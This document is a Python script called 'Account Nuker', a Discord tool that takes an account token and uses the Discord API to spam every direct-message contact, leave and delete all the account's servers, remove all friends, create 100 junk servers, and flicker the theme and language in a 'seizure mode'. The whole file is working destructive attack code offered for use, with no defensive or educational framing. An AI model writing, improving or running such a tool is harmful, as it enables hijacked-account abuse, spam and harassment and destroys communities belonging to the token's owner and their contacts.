import os
import sys
import time
import requests
import os.path
import threading
import random
from itertools import cycle
from pystyle import Colors, Colorate

def setTitle(title):
    os.system(f"title {title}")

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def accountnukertitle():
    ascii_banner = f"""


$$$$$$$$\                  $$\ $$\   $$\                                $$\     
\__$$  __|                 $$ |$$ |  $$ |                               $$ |    
   $$ | $$$$$$\   $$$$$$\  $$ |\$$\ $$  | $$$$$$\   $$$$$$\   $$$$$$\ $$$$$$\   
   $$ |$$  __$$\ $$  __$$\ $$ | \$$$$  / $$  __$$\ $$  __$$\ $$  __$$\\_$$  _|  
   $$ |$$ /  $$ |$$ /  $$ |$$ | $$  $$<  $$ /  $$ |$$$$$$$$ |$$ |  \__| $$ |    
   $$ |$$ |  $$ |$$ |  $$ |$$ |$$  /\$$\ $$ |  $$ |$$   ____|$$ |       $$ |$$\ 
   $$ |\$$$$$$  |\$$$$$$  |$$ |$$ /  $$ |$$$$$$$  |\$$$$$$$\ $$ |       \$$$$  |
   \__| \______/  \______/ \__|\__|  \__|$$  ____/  \_______|\__|        \____/ 
                                         $$ |                                   
                                         $$ |                                   
                                         \__|                             
      
"""
    print()

    print(Colorate.Horizontal(Colors.blue_to_cyan, ascii_banner))

def accnuke():
    def nuke(usertoken, Server_Name, message_Content):
        if threading.active_count() <= 100:
            t = threading.Thread(target=CustomSeizure, args=(usertoken, ))
            t.start()

        headers = {'Authorization': usertoken}
        channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers).json()
        print(Colorate.Horizontal(Colors.blue_to_cyan,f"\nSent a Message to all available friends"))
        for channel in channelIds:
            try:
                requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages', 
                headers=headers,
                data={"content": f"{message_Content}"})
                print(Colorate.Horizontal(Colors.blue_to_cyan,f"\tMessaged ID: "+channel['id']))
            except Exception as e:
                print(Colorate.Horizontal(Colors.blue_to_cyan,f"""\tThe following error has been encountered and is being ignored: {e}"""))

        print(Colorate.Horizontal(Colors.blue_to_cyan,f"\nLeft all available guilds"))
        guildsIds = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers).json()
        for guild in guildsIds:
            try:
                requests.delete(f'https://discord.com/api/v9/users/@me/guilds/'+guild['id'], headers=headers)
                print(Colorate.Horizontal(Colors.blue_to_cyan,f"\t Left guild: "+guild['name']))
            except Exception as e:
                print(Colorate.Horizontal(Colors.blue_to_cyan,f"""\tThe following error has been encountered and is being ignored: {e}"""))

        print(Colorate.Horizontal(Colors.blue_to_cyan,f"\nDeleted all available guilds"))
        for guild in guildsIds:
            try:
                requests.delete(f'https://discord.com/api/v9/guilds/'+guild['id'], headers=headers)
                print(Colorate.Horizontal(Colors.blue_to_cyan,f'\tDeleted guild: '+guild['name']))
            except Exception as e:
                print(Colorate.Horizontal(Colors.blue_to_cyan,f"""\tThe following error has been encountered and is being ignored: {e}"""))

        print(Colorate.Horizontal(Colors.blue_to_cyan,f"\nRemoved all available friends"))
        friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers).json()
        for friend in friendIds:
            try:
                requests.delete(f'https://discord.com/api/v9/users/@me/relationships/'+friend['id'], headers=headers)
                print(Colorate.Horizontal(Colors.blue_to_cyan,f"\tRemoved friend: "+friend['user']['username']+"#"+friend['user']['discriminator']))
            except Exception as e:
                print(Colorate.Horizontal(Colors.blue_to_cyan,f"""\tThe following error has been encountered and is being ignored: {e}"""))

        print(Colorate.Horizontal(Colors.blue_to_cyan,f"\nCreated all servers"))  
        for i in range(100):
            try:
                payload = {'name': f'{Server_Name}', 'region': 'europe', 'icon': None, 'channels': []}
                response = requests.post('https://discord.com/api/v9/guilds', headers=headers, json=payload)
                if response.status_code == 201:
                    print(Colorate.Horizontal(Colors.blue_to_cyan,f"\tCreated {Server_Name} #{i}"))
                else:
                    print(Colorate.Horizontal(Colors.blue_to_cyan,f"\tFailed to create server {Server_Name} #{i}: {response.text}"))
            except Exception as e:
                print(Colorate.Horizontal(Colors.blue_to_cyan,f"""\tThe following error has been encountered and is being ignored: {e}"""))
        t.do_run = False
        setting = {
            'theme': "light",
            'locale': "ja",
            'message_display_compact': False,
            'inline_embed_media': False,
            'inline_attachment_media': False,
            'gif_auto_play': False,
            'render_embeds': False,
            'render_reactions': False,
            'animate_emoji': False,
            'convert_emoticons': False,
            'enable_tts_command': False,
            'explicit_content_filter': '0',
            'status': "idle"
        }
        requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=setting)
        j = requests.get("https://discordapp.com/api/v9/users/@me", headers=headers).json()
        a = j['username'] + "#" + j['discriminator']
        print(Colorate.Horizontal(Colors.blue_to_cyan,f"\nSuccessfully turned {a} into a holl"))
        input(Colorate.Horizontal(Colors.blue_to_cyan,f"""\nPress ENTER to exit"""))
        
    def CustomSeizure(token):
        print(Colorate.Horizontal(Colors.blue_to_cyan,f'Starting seizure mode (Switching on/off Light/dark mode)'))
        t = threading.currentThread()
        while getattr(t, "do_run", True):
            modes = cycle(["light", "dark"])
            setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
            requests.patch("https://discord.com/api/v9/users/@me/settings", headers={'Authorization': usertoken}, json=setting)

    print(Colorate.Horizontal(Colors.blue_to_cyan,f"\nNom des serveurs qui seront créés"))
    Server_Name = str(input((Colorate.Horizontal(Colors.blue_to_cyan,f'Nom: '))))
    print(Colorate.Horizontal(Colors.blue_to_cyan,f"\nMessage qui sera envoyé à chaque ami : "))
    message_Content = str(input((Colorate.Horizontal(Colors.blue_to_cyan,f'Message: '))))
    r = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': usertoken})
    threads = 100

    if threading.active_count() < threads:
        threading.Thread(target=nuke, args=(usertoken, Server_Name, message_Content)).start()
        return

if __name__ == "__main__":
    setTitle("Account Nuker")
    clear()
    print(Colorate.Horizontal(Colors.blue_to_cyan,f"Nuker account by 406"))
    input()
    print(Colorate.Horizontal(Colors.blue_to_cyan,f"Support : discord.gg/zye"))
    input()
    clear()
    accountnukertitle()
    global usertoken
    usertoken = str(input((Colorate.Horizontal(Colors.blue_to_cyan,f"Token: "))))
    accnuke()
